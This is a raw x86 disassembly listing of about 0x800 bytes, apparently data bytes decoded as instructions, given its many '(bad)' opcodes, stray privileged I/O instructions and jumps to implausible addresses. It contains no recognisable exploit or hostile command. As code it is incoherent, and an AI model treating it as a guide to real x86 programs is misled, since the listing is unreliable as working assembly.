  44363d:	imul   esi,DWORD PTR [edi+0x37],0x1c
  443641:	add    sp,bx
  443644:	ret    0xf252
  443647:	dec    edi
  443648:	out    dx,eax
  443649:	inc    ebx
  44364a:	xchg   esp,eax
  44364c:	mov    ebx,DWORD PTR [esi-0x39110b32]
  443652:	(bad)  
  443653:	adc    BYTE PTR [ebx],al
  443655:	sub    al,BYTE PTR [edi+0x436a1c40]
  44365b:	jecxz  0x443660
  44365d:	adc    edi,esp
  44365f:	ret    0x6210
  443662:	call   0xf756:0xf29e0f6f
  443669:	push   edi
  44366a:	repnz add al,BYTE PTR [eax]
  44366d:	bound  esi,QWORD PTR [edi+0x40]
  443670:	sbb    al,0x72
  443672:	jns    0x4436cc
  443674:	sbb    al,0x72
  443676:	test   DWORD PTR [eax+0x1c],ebx
  443679:	add    BYTE PTR [edx+0x27],dl
  44367c:	jecxz  0x4436d1
  44367e:	mov    ebx,ds
  443680:	mov    ds:0xfcb6823c,eax
  443685:	xor    BYTE PTR [edi+0x32bd3176],bl
  44368b:	mov    DWORD PTR [edi-0x18],edx
  44368e:	aad    0x1c
  443690:	jmp    0x44361d
  443692:	daa    
  443693:	mov    ?,WORD PTR [ebp-0x226c39c3]
  443699:	idiv   DWORD PTR [ebp-0x1807c878]
  44369f:	sub    al,0xf3
  4436a1:	pop    esp
  4436a2:	add    edx,esi
  4436a4:	add    al,BYTE PTR [eax]
  4436a6:	(bad)  
  4436a7:	fldcw  WORD PTR [edx]
  4436a9:	jns    0x4436d2
  4436ab:	or     DWORD PTR [ebp+0x7a],edi
  4436ae:	pop    edi
  4436af:	fldl2t 
  4436b1:	add    esp,DWORD PTR [edx-0x5e]
  4436b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4436b5:	inc    esp
  4436b6:	sub    al,0xa0
  4436b8:	jb     0x443699
  4436ba:	pop    ss
  4436bb:	stos   BYTE PTR es:[edi],al
  4436bc:	sub    bh,BYTE PTR [ecx+0x6d]
  4436bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4436c0:	(bad)  
  4436c1:	fdiv   DWORD PTR [ebp-0x7b]
  4436c4:	int    0xe4
  4436c6:	imul   eax
  4436c8:	fisubr WORD PTR [esi+0x66]
  4436cb:	cli    
  4436cc:	dec    ebx
  4436cd:	cld    
  4436ce:	mov    ebp,0x623fdda9
  4436d3:	jno    0x4436f2
  4436d5:	fs xchg cl,bl
  4436d8:	shl    DWORD PTR [eax+0x38],1
  4436db:	sti    
  4436dc:	mov    ch,0x80
  4436de:	add    dh,dh
  4436e0:	loope  0x4436ee
  4436e2:	shl    DWORD PTR ds:0xa20d59b5,0xd9
  4436e9:	jb     0x4436ac
  4436eb:	and    DWORD PTR [edx+0x11],ebp
  4436ee:	cwde   
  4436ef:	jp     0x443686
  4436f1:	jmp    0xea1dfa55
  4436f6:	add    esp,DWORD PTR [edx-0x57]
  4436f9:	jb     0x44373a
  4436fb:	pop    esi
  4436fc:	jmp    0xe99a8e71
  443701:	pop    esp
  443702:	push   edi
  443703:	dec    esi
  443704:	jmp    0xa3d61acb
  443709:	mov    dh,0x78
  44370b:	lahf   
  44370c:	add    DWORD PTR [eax+0x5e],esi
  44370f:	retf   0x62a9
  443712:	ds (bad) 
  443714:	adc    bl,BYTE PTR [edi+eiz*8-0x1bc20533]
  44371b:	jmp    0x4436b1
  44371d:	inc    ecx
  44371e:	jbe    0x443797
  443720:	or     DWORD PTR [eax],eax
  443722:	int    0x2
  443724:	fiadd  DWORD PTR [eax]
  443726:	jmp    0xb4cf4d8c
  44372b:	xchg   ecx,eax
  44372c:	popf   
  44372d:	mov    esp,ebp
  44372f:	popa   
  443730:	fld    DWORD PTR [eax]
  443732:	jmp    0xb29ad94f
  443737:	enter  0xc3a8,0x35
  44373b:	mov    ch,0x15
  44373d:	les    ebp,FWORD PTR ds:0x9ac415ad
  443743:	add    BYTE PTR [edi],bl
  443745:	dec    esi
  443746:	cmp    al,0xc5
  443748:	pop    ecx
  443749:	into   
  44374a:	rcr    BYTE PTR [esi+ebx*2+0x4f],0x44
  44374f:	add    eax,0xd3c4f5a
  443754:	push   esi
  443755:	(bad)  
  443756:	rcl    dh,cl
  443758:	das    
  443759:	dec    esi
  44375a:	fdiv   DWORD PTR [edx-0x56]
  44375d:	fld    QWORD PTR [esi+esi*4]
  443760:	cmovle edx,ebx
  443763:	ret    0x4ea7
  443766:	enter  0xa262,0xdd
  44376a:	or     al,0x72
  44376c:	pop    edx
  44376d:	fst    QWORD PTR [eax]
  44376f:	jb     0x44371b
  443771:	fld    QWORD PTR [eax+edi*4]
  443774:	jmp    DWORD PTR [edi]
  443776:	fstp   TBYTE PTR [eax-0xd27d80c]
  44377c:	cs ins BYTE PTR es:[edi],dx
  44377e:	in     al,dx
  44377f:	jbe    0x44378e
  443781:	dec    esi
  443782:	lock jle 0x4437ff
  443785:	fstp   QWORD PTR [eax]
  443787:	bound  edx,QWORD PTR [esi]
  443789:	dec    esi
  44378a:	cmp    al,0xd
  44378c:	(bad)  
  44378e:	fucomp st(2)
  443790:	push   cs
  443791:	xchg   DWORD PTR [esi],eax
  443793:	adc    cl,BYTE PTR [edx+0x59d610dd]
  443799:	xchg   edi,edi
  44379b:	jmp    DWORD PTR [eax-0x6f]
  44379e:	adc    al,0xc
  4437a0:	in     eax,dx
  4437a1:	aam    0x3e
  4437a3:	xor    ecx,DWORD PTR [ecx+0x4a]
  4437a6:	mov    dh,0x5e
  4437a8:	add    al,dl
  4437aa:	adc    edx,DWORD PTR [eax]
  4437ac:	add    BYTE PTR [edi+0x29],dl
  4437af:	mov    esp,0xbc2947cc
  4437b4:	int3   
  4437b5:	retf   0x3c68
  4437b8:	and    al,0x7f
  4437ba:	stos   BYTE PTR es:[edi],al
  4437bb:	enter  0x4b1b,0x1e
  4437bf:	shl    BYTE PTR [ebx],1
  4437c1:	xor    ecx,DWORD PTR [edx-0x4c]
  4437c4:	and    eax,0xffef257b
  4437c9:	mov    al,0xd
  4437cb:	jb     0x4437d7
  4437cd:	rcr    BYTE PTR ds:0xdcd09459,1
  4437d3:	mov    DWORD PTR [edi+ebx*2],eax
  4437d6:	and    BYTE PTR ds:0xdd4b00,bl
  4437dc:	test   DWORD PTR [ebx+0x8],ecx
  4437df:	jmp    0x45062cb0
  4437e4:	push   ss
  4437e5:	jnp    0x4437c4
  4437e7:	mov    esp,0xbc28c7cc
  4437ec:	int3   
  4437ed:	(bad)  
  4437f0:	dec    DWORD PTR [ebx]
  4437f2:	fld    QWORD PTR [eax]
  4437f4:	add    bl,dl
  4437f6:	sti    
  4437f7:	out    dx,al
  4437f8:	(bad)  
  4437f9:	sti    
  4437fa:	fadd   QWORD PTR [eax]
  4437fc:	add    ch,ah
  4437fe:	sti    
  4437ff:	out    dx,al
  443800:	inc    ecx
  443802:	repnz cmp al,BYTE PTR [eax]
  443805:	in     eax,0xf2
  443807:	cmp    al,BYTE PTR [eax]
  443809:	sti    
  44380a:	fadd   QWORD PTR [eax]
  44380c:	add    BYTE PTR [eax],al
  44380e:	inc    esp
  44380f:	sti    
  443810:	out    dx,al
  443811:	dec    esi
  443813:	and    BYTE PTR [eax+0x0],al
  443816:	(bad)  
  443817:	jmp    0x2a678da
  44381c:	add    eax,DWORD PTR [eax]
  44381e:	bound  ebx,QWORD PTR [edi-0x2e4a081e]
  443824:	mov    esi,0xbed56240
  443829:	inc    eax
  44382a:	bound  eax,QWORD PTR [edx]
  44382c:	add    eax,DWORD PTR [eax]
  44382e:	bound  edi,QWORD PTR [edi+0x7795f7e2]
  443834:	mov    esi,0xbea36240
  443839:	inc    eax
  44383a:	bound  eax,QWORD PTR [edx]
  44383c:	add    eax,DWORD PTR [eax]
  44383e:	(bad)  
  44383f:	(bad)  
  443841:	div    DWORD PTR [ebp-0x40]
  443844:	mov    ebp,0xbdbc6240
  443849:	inc    eax
  44384a:	bound  eax,QWORD PTR [edx]
  44384c:	add    eax,DWORD PTR [eax]
  44384e:	(bad)  
  44384f:	jmp    eax
  443851:	not    DWORD PTR [ebp+0x7e]
  443854:	mov    esi,0xbe7a6240
  443859:	inc    eax
  44385a:	bound  eax,QWORD PTR [edx]
  44385c:	add    eax,DWORD PTR [eax]
  44385e:	bound  ebx,QWORD PTR [edi]
  443860:	loope  0x443859
  443862:	xor    eax,0x6240bece
  443867:	retf   0x40be
  44386a:	bound  eax,QWORD PTR [edx]
  44386c:	add    eax,DWORD PTR [eax]
  44386e:	bound  edi,QWORD PTR [edi]
  443870:	loope  0x443869
  443872:	add    BYTE PTR ds:0x6240bd1e,dl
  443878:	sbb    bh,BYTE PTR [ebp+0x3026240]
  44387e:	add    BYTE PTR [edx+0x5f],ah
  443881:	loope  0x44387a
  443883:	cmc    
  443884:	dec    ecx
  443885:	ret    
  443886:	inc    eax
  443887:	bound  ebx,QWORD PTR [esi-0x3d]
  44388a:	inc    eax
  44388b:	bound  eax,QWORD PTR [edx]
  44388d:	add    eax,DWORD PTR [eax]
  44388f:	(bad)  
  443890:	fstp   DWORD PTR [esi-0x1f]
  443893:	int    0xf7
  443895:	push   es
  443896:	cmp    eax,0x3d1bd923
  44389b:	and    ebx,ecx
  44389d:	jmp    0x3f1d9aa5
  4438a2:	loope  0x443851
  4438a4:	neg    edx
  4438a6:	push   0x68d7d923
  4438ab:	and    ebx,ecx
  4438ad:	jmp    0x1f1d9ab5
  4438b2:	loope  0x443841
  4438b4:	test   edx,0xc7d923b4
  4438ba:	mov    ah,0x23
  4438bc:	fldl2t 
  4438be:	add    esp,DWORD PTR [edx-0x27]
  4438c1:	(bad)  
  4438c2:	loopne 0x443931
  4438c4:	neg    edi
  4438c6:	cmp    DWORD PTR [eax],esp
  4438c8:	fxch   st(4)
  4438ca:	cmp    DWORD PTR [eax],esp
  4438cc:	fldl2t 
  4438ce:	add    esp,DWORD PTR [edx-0x27]
  4438d1:	fsubrp st(0),st
  4438d3:	dec    ebp
  4438d4:	imul   DWORD PTR [edx-0x265fffc9]
  4438da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4438db:	aaa    
  4438dc:	mov    al,ds:0x6203e9d9
  4438e1:	fnstcw WORD PTR [esi+0x74f72de0]
  4438e7:	loope  0x443889
  4438e9:	fldcw  WORD PTR [ecx-0x16265f1f]
  4438ef:	add    esp,DWORD PTR [edx-0x27]
  4438f2:	sahf   
  4438f3:	loopne 0x443902
  4438f5:	test   DWORD PTR [esi-0x6c265e93],0xe9d9a16d
  4438ff:	add    esp,DWORD PTR [edx-0x27]
  443902:	jle    0x4438e4
  443904:	in     eax,dx
  443905:	mul    BYTE PTR [esi]
  443907:	outs   dx,BYTE PTR ds:[esi]
  443908:	mov    eax,ds:0x741b00d9
  44390d:	call   0x6600:0xd961e900
  443914:	ret    0xf6ee
  443917:	sub    BYTE PTR [ecx],bh
  443919:	call   0xe900:0x9a392c00
  443920:	popa   
  443921:	fld    DWORD PTR [eax]
  443923:	inc    esi
  443924:	ret    0xf6ee
  443927:	pop    eax
  443928:	cmp    BYTE PTR [edx-0x65c7a400],bl
  44392e:	add    cl,ch
  443930:	popa   
  443931:	fld    DWORD PTR [eax]
  443933:	es sub dh,0xf6
  443937:	fwait
  443938:	(bad)  
  443939:	cdq    
  44393a:	add    BYTE PTR [edi+0x99f600],bl
  443940:	jmp    0xe94512a6
  443945:	popa   
  443946:	fld    DWORD PTR [eax]
  443948:	jmp    0x9c4512ae
  44394d:	fdivp  st(5),st
  44394f:	push   ds
  443950:	pusha  
  443951:	inc    esp
  443952:	mov    BYTE PTR [edx+0x3f],dl
  443955:	inc    esi
  443956:	pop    ecx
  443957:	adc    cl,ch
  443959:	popa   
  44395a:	jns    0x44396d
  44395c:	jmp    0xe955c6c2
  443961:	popa   
  443962:	xchg   ecx,eax
  443963:	adc    ecx,ebp
  443965:	popa   
  443966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443967:	adc    ecx,ebp
  443969:	popa   
  44396a:	xchg   ebp,eax
  44396b:	adc    ecx,ebp
  44396d:	popa   
  44396e:	dec    ebp
  44396f:	adc    ecx,ebp
  443971:	popa   
  443972:	popa   
  443973:	adc    ecx,ebp
  443975:	popa   
  443976:	jne    0x443989
  443978:	jmp    0xe955d2de
  44397d:	popa   
  44397e:	lods   eax,DWORD PTR ds:[esi]
  44397f:	adc    ecx,ebp
  443981:	popa   
  443982:	mov    cl,0x11
  443984:	add    BYTE PTR [ebx],cl
  443986:	fisub  DWORD PTR [ecx+edx*1]
  443989:	sti    
  44398a:	fnstenv [ecx+edx*1]
  44398d:	sti    
  44398e:	fldcw  WORD PTR [ecx+edx*1-0x35]
  443992:	fldcw  WORD PTR [eax+0x11]
  443995:	retf   
  443996:	fnstcw WORD PTR [ecx]
  443998:	sbb    bh,BYTE PTR [ebx-0x44eedf27]
  44399e:	(bad)  [ecx+edx*1]
  4439a1:	add    bl,cl
  4439a3:	fstp   DWORD PTR [eax]
  4439a5:	adc    ebx,ecx
  4439a7:	fld    DWORD PTR [ecx+edx*1]
  4439aa:	mov    ebx,0xbb1114d9
  4439af:	(bad)  [ecx+edx*1-0x75]
  4439b3:	(bad)  [eax+0x11]
  4439b6:	mov    ebx,ecx
  4439b8:	xor    al,0x11
  4439ba:	jnp    0x443995
  4439bc:	add    BYTE PTR [ecx],dl
  4439be:	jnp    0x443999
  4439c0:	in     al,dx
  4439c1:	adc    BYTE PTR [ebx-0x74ef0727],cl
  4439c7:	ftst   
  4439c9:	adc    BYTE PTR [ebx-0x27],bh
  4439cc:	hlt    
  4439cd:	adc    BYTE PTR [ebx-0x27],bh
  4439d0:	sub    al,0x11
  4439d2:	dec    ebx
  4439d3:	fldcw  WORD PTR [eax]
  4439d5:	adc    DWORD PTR [ebx-0x27],ecx
  4439d8:	adc    al,0x11
  4439da:	cmp    ebx,ecx
  4439dc:	loopne 0x4439ee
  4439de:	cmp    ebx,ecx
  4439e0:	int3   
  4439e1:	adc    BYTE PTR [ebx-0x27],cl
  4439e4:	fcom   DWORD PTR [eax]
  4439e6:	dec    ebx
  4439e7:	fld    st(4)
  4439e9:	adc    BYTE PTR [ebx],bh
  4439eb:	(bad)  
  4439ed:	adc    BYTE PTR [ebx],bh
  4439ef:	(bad)  [ecx+edx*1]
  4439f2:	or     ebx,ecx
  4439f4:	xchg   esi,eax
  4439f5:	adc    DWORD PTR [ebx],ecx
  4439f7:	fxtract 
  4439f9:	adc    bl,bh
  4439fb:	fadd   st,st(0)
  4439fd:	adc    BYTE PTR [edx+0x2],ah
  443a00:	add    esi,DWORD PTR [edx+edx*2+0xb80302]
  443a07:	push   edx
  443a08:	add    al,BYTE PTR [ebx]
  443a0a:	lods   al,BYTE PTR ds:[esi]
  443a0b:	push   edx
  443a0c:	add    al,BYTE PTR [ebx]
  443a0e:	mov    esp,0xf4030252
  443a13:	jb     0x443a17
  443a15:	add    edi,DWORD PTR [esi+0x73]
  443a18:	add    al,BYTE PTR [ebx]
  443a1a:	fdiv   QWORD PTR [edx+0x2]
  443a1d:	add    esp,DWORD PTR [eax-0x6bfcfd8e]
  443a23:	push   edx
  443a24:	add    al,BYTE PTR [ebx]
  443a26:	cwde   
  443a27:	push   edx
  443a28:	add    al,BYTE PTR [ebx]
  443a2a:	mov    WORD PTR [edx+0x2],ss
  443a2d:	add    ebx,DWORD PTR [edx+edx*2+0x72d40302]
  443a34:	add    al,BYTE PTR [ebx]
  443a36:	pop    esi
  443a37:	jae    0x443a3b
  443a39:	add    edi,DWORD PTR [edx+esi*2+0x72800302]
  443a40:	add    al,BYTE PTR [ebx]
  443a42:	je     0x443a96
  443a44:	add    al,BYTE PTR [ebx]
  443a46:	js     0x443a9a
  443a48:	add    al,BYTE PTR [ebx]
  443a4a:	ins    BYTE PTR es:[edi],dx
  443a4b:	push   edx
  443a4c:	add    al,BYTE PTR [ebx]
  443a4e:	jl     0x443aa2
  443a50:	add    al,BYTE PTR [ebx]
  443a52:	mov    ah,0x72
  443a54:	add    al,BYTE PTR [ebx]
  443a56:	ds jae 0x443a5b
  443a59:	add    ebx,DWORD PTR [edx+esi*2+0x73100302]
  443a60:	add    al,BYTE PTR [ebx]
  443a62:	add    al,0x53
  443a64:	add    al,BYTE PTR [ebx]
  443a66:	or     BYTE PTR [ebx+0x2],dl
  443a69:	add    edi,esp
  443a6b:	add    BYTE PTR [edx+0x2],dl
  443a6e:	add    eax,DWORD PTR [eax]
  443a70:	push   ebx
  443a71:	add    al,BYTE PTR [ebx]
  443a73:	hlt    
  443a74:	jb     0x443a78
  443a76:	add    edi,eax
  443a78:	jb     0x443a53
  443a7a:	jmp    0xea0d3882
  443a7f:	add    eax,esi
  443a81:	enter  0x3e9,0x22
  443a85:	leave  
  443a86:	jmp    0xea0ce88e
  443a8b:	add    ebp,DWORD PTR [edx-0x49fc1638]
  443a91:	enter  0x3e9,0x12
  443a95:	leave  
  443a96:	jmp    0xea0d389e
  443a9b:	add    edi,edx
  443a9d:	enter  0x3e9,0x92
  443aa1:	leave  
  443aa2:	jmp    0xea0dc0aa
  443aa7:	add    ecx,DWORD PTR [edx+0x4e03e9c9]
  443aad:	leave  
  443aae:	jmp    0xea0dbcb6
  443ab3:	add    esi,DWORD PTR [esi-0x37]
  443ab6:	jmp    0xea0db4be
  443abb:	add    ebx,DWORD PTR [esi-0x37]
  443abe:	jmp    0xea0dacc6
  443ac3:	add    esp,DWORD PTR [esi-0x37]
  443ac6:	jmp    0xea0da4ce
  443acb:	add    ebp,DWORD PTR [esi-0x1d]
  443ace:	jmp    0xc9a63ad6
  443ad3:	jmp    0xea2790db
  443ad8:	add    ebx,DWORD PTR [edx-0x1d]
  443adb:	jmp    0xea2778e3
  443ae0:	add    edx,DWORD PTR [edx-0x1d]
  443ae3:	jmp    0xea2780eb
  443ae8:	add    ebx,DWORD PTR [eax+ecx*8-0x17]
  443aec:	add    ebx,DWORD PTR [esi]
  443aee:	jecxz  0x443ad9
  443af0:	add    edi,esp
  443af2:	leave  
  443af3:	add    cl,ch
  443af5:	popa   
  443af6:	aas    
  443af7:	adc    cl,ch
  443af9:	popa   
  443afa:	sub    cl,BYTE PTR [edi]
  443afc:	jmp    0xe9533862
  443b01:	popa   
  443b02:	fcom   DWORD PTR [edx]
  443b04:	jmp    0xe955906a
  443b09:	popa   
  443b0a:	sbb    eax,0xba61e907
  443b0f:	adc    cl,ch
  443b11:	popa   
  443b12:	sbb    DWORD PTR [edi],eax
  443b14:	jmp    0xe94b687a
  443b19:	popa   
  443b1a:	xor    DWORD PTR [edi],eax
  443b1c:	jmp    0xe94b8082
  443b21:	popa   
  443b22:	inc    ebp
  443b23:	pop    es
  443b24:	jmp    0xe94b648a
  443b29:	popa   
  443b2a:	cmp    eax,0x4161e907
  443b2f:	pop    es
  443b30:	jmp    0xe94b9096
  443b35:	add    BYTE PTR [ecx+0x39],ah
  443b38:	pop    es
  443b39:	jmp    0xe94b889f
  443b3e:	popa   
  443b3f:	push   ecx
  443b40:	pop    es
  443b41:	jmp    0xe94ba0a7
  443b46:	popa   
  443b47:	dec    ecx
  443b48:	pop    es
  443b49:	jmp    0xe94b98af
  443b4e:	popa   
  443b4f:	popa   
  443b50:	pop    es
  443b51:	jmp    0xe94bb0b7
  443b56:	popa   
  443b57:	pop    ecx
  443b58:	pop    es
  443b59:	jmp    0xe94ba8bf
  443b5e:	popa   
  443b5f:	jno    0x443b68
  443b61:	jmp    0xe94b49c7
  443b66:	popa   
  443b67:	adc    edx,DWORD PTR [ecx]
  443b69:	jmp    0x5558cf
  443b6e:	cmp    edx,esi
  443b70:	mov    edi,0x50d63b0f
  443b75:	ud2    
  443b77:	(bad)  
  443b78:	cmp    al,0xf
  443b7a:	or     edx,esi
  443b7c:	dec    eax
  443b7d:	psubq  mm2,mm5
  443b80:	xor    al,0xf
  443b82:	sti    
  443b83:	aad    0x40
  443b85:	ud2    
  443b87:	(bad)  
  443b88:	sub    al,0xf
  443b8a:	or     edx,esi
  443b8c:	cmp    BYTE PTR [edi],cl
  443b8e:	sti    
  443b8f:	aad    0x24
  443b91:	psubq  mm2,mm5
  443b94:	xor    BYTE PTR [edi],cl
  443b96:	retf   
  443b97:	aad    0x1c
  443b99:	str    ebx
  443b9c:	aad    0x28
  443b9e:	btc    ebp,edx
  443ba1:	adc    DWORD PTR ds:[ebx-0x34f0cf2b],edi
  443ba8:	aad    0x1c
  443baa:	bswap  ebx
  443bac:	aad    0x28
  443bae:	btc    ebp,edx
  443bb1:	adc    al,0xf
  443bb3:	mov    ebx,0x8b0f20d5
  443bb8:	aad    0xc
  443bba:	jnp    0x7b535495
  443bc0:	aad    0x4
  443bc2:	(bad)  
  443bc4:	aad    0x10
  443bc6:	jnp    0x8b5338a1
  443bcc:	aad    0xc3
  443bce:	adc    BYTE PTR [ebx-0x2b],bh
  443bd1:	hlt    
  443bd2:	push   cs
  443bd3:	jnp    0x443baa
  443bd5:	add    BYTE PTR [edi],cl
  443bd7:	dec    ebx
  443bd8:	fucomp st(4)
  443bda:	push   cs
  443bdb:	dec    ebx
  443bdc:	(bad)  
  443bde:	push   cs
  443bdf:	cmp    ebx,ebp
  443be1:	in     al,0xe
  443be3:	cmp    ebx,ebp
  443be5:	xor    al,0x10
  443be7:	bound  eax,QWORD PTR [edx]
  443be9:	add    edx,DWORD PTR [eax+0x52]
  443bec:	add    al,BYTE PTR [ebx]
  443bee:	xor    al,0x52
  443bf0:	add    al,BYTE PTR [ebx]
  443bf2:	dec    eax
  443bf3:	push   edx
  443bf4:	add    al,BYTE PTR [ebx]
  443bf6:	loopne 0x443c64
  443bf8:	add    al,BYTE PTR [ebx]
  443bfa:	aam    0x64
  443bfc:	add    al,BYTE PTR [ebx]
  443bfe:	fadd   DWORD PTR [eax]
  443c00:	pop    esp
  443c01:	add    al,BYTE PTR [ebx]
  443c03:	int3   
  443c04:	push   esp
  443c05:	add    al,BYTE PTR [ebx]
  443c07:	int3   
  443c08:	ins    BYTE PTR es:[edi],dx
  443c09:	add    al,BYTE PTR [ebx]
  443c0b:	add    al,0x65
  443c0d:	add    al,BYTE PTR [ebx]
  443c0f:	enter  0x25c,0x3
  443c13:	mov    esp,0xc0030254
  443c18:	ins    BYTE PTR es:[edi],dx
  443c19:	add    al,BYTE PTR [ebx]
  443c1b:	mov    ah,0x64
  443c1d:	add    al,BYTE PTR [ebx]
  443c1f:	mov    eax,0xac03025c
  443c24:	push   esp
  443c25:	add    al,BYTE PTR [ebx]
  443c27:	lods   al,BYTE PTR ds:[esi]
  443c28:	ins    BYTE PTR es:[edi],dx
  443c29:	add    al,BYTE PTR [ebx]
  443c2b:	mov    al,0x64
  443c2d:	add    al,BYTE PTR [ebx]
  443c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443c30:	pop    esp
  443c31:	add    al,BYTE PTR [ebx]
  443c33:	test   al,0x54
  443c35:	add    al,BYTE PTR [ebx]
  443c37:	pushf  
  443c38:	ins    BYTE PTR es:[edi],dx
  443c39:	add    al,BYTE PTR [ebx]
  443c3b:	mov    al,ds:0x94030264
  443c40:	pop    esp
  443c41:	add    al,BYTE PTR [ebx]
  443c43:	cwde   
  443c44:	push   esp
  443c45:	add    al,BYTE PTR [ebx]
  443c47:	loopne 0x443cb5
  443c49:	add    al,BYTE PTR [ebx]
  443c4b:	aam    0x64
  443c4d:	add    al,BYTE PTR [ebx]
  443c4f:	fcomp  DWORD PTR [edx+eax*1+0x3]
  443c53:	int3   
  443c54:	push   esp
  443c55:	add    al,BYTE PTR [ebx]
  443c57:	shr    BYTE PTR [edx+eax*1+0x3],1
  443c5b:	les    esp,FWORD PTR [edx+eax*1+0x3]
  443c5f:	enter  0xd95c,0xe9
  443c63:	add    eax,DWORD PTR [eax]
  443c65:	push   es
  443c66:	fucomip st,st(1)
  443c68:	add    ebx,DWORD PTR [ecx]
  443c6a:	fucomip st,st(1)
  443c6c:	add    esp,DWORD PTR ds:0xfd03e9df
  443c72:	fucomip st,st(1)
  443c74:	add    eax,DWORD PTR [esi-0x63fc1621]
  443c7a:	loopne 0x443c65
  443c7c:	add    esp,eax
  443c7e:	fucomip st,st(1)
  443c80:	add    esp,DWORD PTR [ecx]
  443c82:	fucomip st,st(1)
  443c84:	add    eax,DWORD PTR [edi-0x20]
  443c87:	jmp    0xea24c28f
  443c8c:	add    ebx,DWORD PTR [esi-0x22fc1621]
  443c92:	fucomip st,st(1)
  443c94:	add    esp,DWORD PTR [esi]
  443c96:	fucomip st,st(1)
  443c98:	add    esp,DWORD PTR [edx]
  443c9a:	fucomip st,st(1)
  443c9c:	add    esp,DWORD PTR [edx]
  443c9e:	fucomip st,st(1)
  443ca0:	add    edi,DWORD PTR [edx]
  443ca2:	fucomip st,st(1)
  443ca4:	add    esi,DWORD PTR [esi-0x21]
  443ca7:	jmp    0xea23beaf
  443cac:	add    ecx,DWORD PTR [esi-0x21]
  443caf:	jmp    0xea2386b7
  443cb4:	add    edx,DWORD PTR [esi-0x21]
  443cb7:	jmp    0xea2485bf
  443cbc:	add    esi,DWORD PTR [ebp-0x20]
  443cbf:	jmp    0xea23a6c7
  443cc4:	add    edx,DWORD PTR [esi-0x21]
  443cc7:	jmp    0xc82c3ccf
  443ccc:	jmp    0xea0bead4
  443cd1:	add    edx,DWORD PTR [ebx]
  443cd3:	shr    ecx,1
  443cd5:	add    edi,DWORD PTR [ebp-0x77fc1630]
  443cdb:	rol    BYTE PTR [eax],1
  443cdd:	jmp    0xe95dae43
  443ce2:	popa   
  443ce3:	pop    es
  443ce4:	sbb    ecx,ebp
  443ce6:	popa   
  443ce7:	test   al,0x1a
  443ce9:	jmp    0xe9493a4f
  443cee:	popa   
  443cef:	jmp    0xf5a625f8
  443cf4:	add    al,0xe9
  443cf6:	popa   
  443cf7:	add    DWORD PTR ds:0x50d61e9,eax
  443cfd:	jmp    0xe9493663
  443d02:	popa   
  443d03:	add    eax,0x1161e905
  443d08:	add    eax,0x6c961e9
  443d0d:	jmp    0xe94b1273
  443d12:	popa   
  443d13:	das    
  443d14:	pop    es
  443d15:	jmp    0xe9495e7b
  443d1a:	popa   
  443d1b:	sbb    DWORD PTR ds:0x52561e9,eax
  443d21:	jmp    0xe9496e87
  443d26:	popa   
  443d27:	cmp    eax,0x6761e905
  443d2c:	push   es
  443d2d:	jmp    0x5799e32
  443d32:	jmp    0xe9512798
  443d37:	popa   
  443d38:	mov    edi,0x3961e90e
  443d3d:	add    eax,0x54561e9
  443d42:	jmp    0xe954f2a8
  443d47:	popa   
  443d48:	xchg   ebx,eax
  443d49:	adc    cl,ch
  443d4b:	popa   
  443d4c:	dec    ecx
  443d4d:	add    eax,0x55561e9
  443d52:	jmp    0x499eb8
  443d57:	jnp    0x443d33
  443d59:	je     0x443d68
  443d5b:	dec    ebx
  443d5c:	fiadd  DWORD PTR [eax+0x6cda4b0d]
  443d62:	or     eax,0x10a8da3b
  443d67:	cmp    ebx,edx
  443d69:	mov    ch,0x10
  443d6b:	dec    ebx
  443d6c:	(bad)  
  443d6e:	adc    BYTE PTR [ebx-0x26],cl
  443d71:	out    dx,eax
  443d72:	adc    BYTE PTR [ebx],bh
  443d74:	ficomp DWORD PTR [eax+0xd]
  443d77:	cmp    ebx,edx
  443d79:	inc    esp
  443d7a:	or     eax,0xfaeda0b
  443d7f:	or     ebx,edx
  443d81:	dec    esp
  443d82:	or     eax,0xd58d9fb
  443d87:	sti    
  443d88:	fld    DWORD PTR [ebp+ecx*1+0xb]
  443d8c:	ficom  DWORD PTR [eax+0xd]
  443d8f:	or     ebx,edx
  443d91:	cmp    al,0xd
  443d93:	add    bl,bh
  443d95:	fst    DWORD PTR [esi+0x34d9fb0f]
  443d9b:	or     eax,0xf8ed9cb
  443da0:	retf   
  443da1:	fstp   DWORD PTR [ecx*1+0xd38d9bb]
  443da8:	mov    ebx,0xcb0f92d9
  443dad:	fldenv [eax]
  443daf:	or     eax,0xd0cd9cb
  443db4:	mov    ebx,0xbb0d18d9
  443db9:	fld    DWORD PTR [ecx*1+0xd10d98b]
  443dc0:	mov    ebx,ecx
  443dc2:	cld    
  443dc3:	or     al,0x7b
  443dc5:	(bad)  [eax]
  443dc7:	or     eax,0xcf4d97b
  443dcc:	mov    ebx,ecx
  443dce:	jne    0x443de4
  443dd0:	bound  eax,QWORD PTR [eax]
  443dd2:	add    esi,esp
  443dd4:	pop    esi
  443dd5:	add    BYTE PTR [ebx],al
  443dd7:	clc    
  443dd8:	push   esi
  443dd9:	add    BYTE PTR [ebx],al
  443ddb:	in     al,dx
  443ddc:	outs   dx,BYTE PTR ds:[esi]
  443ddd:	add    al,BYTE PTR [ebx]
  443ddf:	lock data16 add al,BYTE PTR [ebx]
  443de3:	in     al,0x5e
  443de5:	add    al,BYTE PTR [ebx]
  443de7:	call   0xdc474042
  443dec:	outs   dx,BYTE PTR ds:[esi]
  443ded:	add    al,BYTE PTR [ebx]
  443def:	sub    BYTE PTR [edx+eax*1+0x3],ah
  443df3:	sbb    al,0x5c
  443df5:	add    al,BYTE PTR [ebx]
  443df7:	and    BYTE PTR [eax],al
  443df9:	push   esp
  443dfa:	add    al,BYTE PTR [ebx]
  443dfc:	adc    al,0x6c
  443dfe:	add    al,BYTE PTR [ebx]
  443e00:	ss add al,BYTE PTR gs:[ebx]
  443e04:	cmp    bl,BYTE PTR [ebp+0x2]
  443e07:	add    ebp,DWORD PTR [esi]
  443e09:	push   ebp
  443e0a:	add    al,BYTE PTR [ebx]
  443e0c:	xor    ch,BYTE PTR [ebp+0x2]
  443e0f:	add    eax,eax
  443e11:	data16 add al,BYTE PTR [ebx]
  443e14:	mov    ah,0x5e
  443e16:	add    al,BYTE PTR [ebx]
  443e18:	mov    eax,0xac030256
